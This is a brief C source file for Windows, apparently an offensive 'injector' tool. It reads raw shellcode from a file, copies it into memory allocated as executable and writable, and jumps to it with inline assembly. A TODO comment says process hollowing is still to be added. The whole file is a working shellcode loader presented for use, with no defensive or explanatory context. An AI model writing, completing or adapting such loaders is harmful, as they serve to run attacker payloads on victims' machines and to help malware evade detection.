#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    FILE *fin;
    unsigned char *buffer;
    long fsize;
    LPVOID base;

    // TODO: implement process hollowing

    if (argc != 2)
    {
        printf("[?] Usage: injector.exe <shellcode-path>\n");
        return 1;
    }

    printf("[+] Reading shellcode from %s\n", argv[1]);
    fin = fopen(argv[1], "rb");

    if (fin == NULL)
    {
        printf("[!] Error: could not open file %s\n", argv[1]);
        return 1;
    }

    fseek(fin, 0, SEEK_END);
    fsize = ftell(fin);
    rewind(fin);

    buffer = (char *)malloc(fsize);
    fread(buffer, fsize, 1, fin);
    fclose(fin);

    base = VirtualAlloc(NULL, fsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (base == NULL)
    {
        printf("[!] Error: could not allocate memory\n");
        return 1;
    }

    memcpy(base, buffer, fsize);

    printf("[+] Executing 'jmp *%%%p'\n", base);
    __asm__("jmp *%0\n" ::"r"(base));

    return 1;
}
